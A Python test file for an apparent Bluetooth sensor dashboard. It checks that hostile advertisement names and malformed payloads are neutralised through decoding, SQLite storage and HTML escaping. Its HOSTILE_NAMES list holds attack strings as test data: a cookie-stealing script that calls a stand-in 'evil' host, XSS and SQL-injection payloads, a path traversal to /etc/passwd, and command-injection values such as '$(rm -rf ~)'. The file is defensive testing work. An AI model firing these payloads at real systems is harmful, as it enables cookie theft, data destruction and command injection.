"""What happens when the air is hostile.

Bask continuously ingests BLE advertisements, and anyone within radio range can
broadcast whatever they like — including a fake Govee company ID, so the filter
is not a trust boundary. This walks attacker-controlled bytes through the whole
path (decode -> SQLite -> API -> what the browser receives) and asserts each hop
neutralises them.

If any of this ever fails, the advertisement path has become an injection route.
"""
import json
import os
import sys
import tempfile
import time
from pathlib import Path

ROOT = Path(__file__).parent.parent
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "scanner"))

GOVEE_CID = 0xEC88

HOSTILE_NAMES = [
    "<script>fetch('http://evil/'+document.cookie)</script>",
    "<img src=x onerror=alert(1)>",
    "'; DROP TABLE discovered;--",
    '" onmouseover="alert(1)',
    "../../../../etc/passwd",
    "$(rm -rf ~)",
    "`reboot`",
    "\x00\x01\x02 nul bytes",
    "A" * 4000,                       # far longer than any real advertisement
    "🐍" * 200,
]

MALFORMED_PAYLOADS = [
    {},                                # no manufacturer data at all
    {GOVEE_CID: b""},                  # empty
    {GOVEE_CID: b"\x00"},              # shorter than the length check
    {GOVEE_CID: b"\x00\x01\x02"},      # exactly one byte short
    {GOVEE_CID: b"\xff" * 200},        # far longer than expected
    {GOVEE_CID: b"\x00\xff\xff\xff\xff"},   # max raw value
    {0x0000: b"\x00\x01\x02\x03\x04"},      # wrong company id
    {GOVEE_CID: bytes(range(256))},         # every byte value
]


def test_decoder_never_raises_on_hostile_input():
    from govee import decode
    for payload in MALFORMED_PAYLOADS:
        result = decode(payload)   # must return None or a tuple, never explode
        assert result is None or (isinstance(result, tuple) and len(result) == 3), result
    print("  decoder survives every malformed payload without raising")


def test_hostile_names_round_trip_through_sqlite_intact_and_inert():
    """SQL is parameterised, so a name containing SQL is stored as literal text."""
    with tempfile.TemporaryDirectory() as tmp:
        os.environ["BASK_DATA_DIR"] = tmp
        import importlib
        import db as dbmod
        importlib.reload(dbmod)
        dbmod.init_db()

        # get_discovered() filters on wall-clock time, so use a real "now".
        now = int(time.time())
        items = [(f"AA:BB:CC:00:00:{i:02X}", {
            "name": name, "temp_c": 20.0, "humidity": 50.0,
            "battery": 90, "rssi": -50, "ts": now,
        }) for i, name in enumerate(HOSTILE_NAMES)]
        dbmod.flush_discovered(items, now)

        rows = dbmod.get_discovered(within_seconds=300)
        stored = {r["name"] for r in rows}
        # The table still exists and every hostile name is inert text.
        assert len(rows) == len(HOSTILE_NAMES), "the DROP TABLE payload damaged the table"
        assert "'; DROP TABLE discovered;--" in stored
        print(f"  {len(rows)} hostile names stored as literal text; no SQL executed")


def test_the_browser_never_receives_executable_markup():
    """
    The API returns raw JSON, so the guarantee has to hold in the frontend.
    Mirror its esc() and prove the dangerous characters cannot survive it.
    """
    import re
    source = (ROOT / "frontend" / "app.js").read_text()

    # Every render path that puts a discovered device name into innerHTML must
    # wrap it, or a crafted advertisement becomes stored XSS on the dashboard.
    for pattern in (r"\$\{esc\(d\.name\)\}", r"\$\{esc\(d\.mac\)\}"):
        assert re.search(pattern, source), f"unescaped device field: {pattern}"
    unescaped = re.findall(r"\$\{d\.name\}|\$\{d\.mac\}", source)
    assert not unescaped, f"device data reaches innerHTML unescaped: {unescaped}"

    def esc(s: str) -> str:                    # same table as frontend/app.js
        return (s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
                 .replace('"', "&quot;").replace("'", "&#39;"))

    for name in HOSTILE_NAMES:
        out = esc(name)
        assert "<script" not in out.lower()
        assert "<img" not in out.lower()
        assert not re.search(r"on\w+\s*=", out) or '"' not in out
        for ch in "<>\"'":
            assert ch not in out
    print("  all device fields are escaped before rendering; markup cannot survive")


def main() -> None:
    test_decoder_never_raises_on_hostile_input()
    test_hostile_names_round_trip_through_sqlite_intact_and_inert()
    test_the_browser_never_receives_executable_markup()
    print("Hostile-advertisement tests passed.")


if __name__ == "__main__":
    main()
